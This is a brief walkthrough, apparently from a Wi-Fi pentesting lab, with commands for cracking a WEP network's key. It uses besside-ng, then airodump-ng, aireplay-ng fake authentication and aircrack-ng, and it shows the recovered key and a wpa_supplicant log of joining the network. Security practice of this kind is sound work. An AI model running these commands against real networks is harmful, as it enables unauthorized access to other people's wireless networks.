1. https://github.com/A1vinSmith/Wi-Fi-Pentesting-Cheatsheet/blob/main/Wifi/cheatsheet/3%20-%20cracking.md#extra-wep
`sudo besside-ng -c 1 -b F0:9F:C2:AA:19:29 wlan2 -v`
2. step one can get the hex key already. Below for doing it mannually.
3. 
```bash
sudo airodump-ng -c 1 --bssid F0:9F:C2:AA:19:29 -w wifi-old wlan0mon

sudo aireplay-ng -1 3600 -q  10 -a F0:9F:C2:AA:19:29 wlan0mon

sudo aircrack-ng wifi-old-01.cap
```

`KEY FOUND! [ 11:BB:33:CD:55 ]`

4. ```bash
sudo wpa_supplicant -iwlan2 -c wep.conf -D nl80211
Successfully initialized wpa_supplicant
wlan2: SME: Trying to authenticate with f0:9f:c2:aa:19:29 (SSID='wifi-old' freq=2412 MHz)
nl80211: kernel reports: key not allowed
wlan2: Trying to associate with f0:9f:c2:aa:19:29 (SSID='wifi-old' freq=2412 MHz)
wlan2: Associated with f0:9f:c2:aa:19:29
wlan2: CTRL-EVENT-CONNECTED - Connection to f0:9f:c2:aa:19:29 completed [id=0 id_str=]
wlan2: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
```

-D is optional